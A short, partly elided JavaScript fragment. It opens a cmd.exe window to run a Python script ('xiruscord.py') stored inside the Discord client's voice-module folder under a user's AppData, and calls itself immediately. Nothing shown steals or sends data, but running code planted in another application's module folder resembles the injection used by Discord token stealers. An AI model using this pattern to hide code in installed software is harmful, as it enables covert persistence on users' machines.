...
const pythonScript = 'C:/Users/actex/AppData/Local/Discord/app-1.0.9152/modules/discord_voice-1/discord_voice/xiruscord.py';

// Function to open a new terminal window and run the Python script
function openTerminalAndRunPython() {
  // Command to open a new terminal window and run Python script
  const command = `start cmd.exe /K python "${pythonScript}"`;
...
// Call the function to open terminal and run Python script
openTerminalAndRunPython();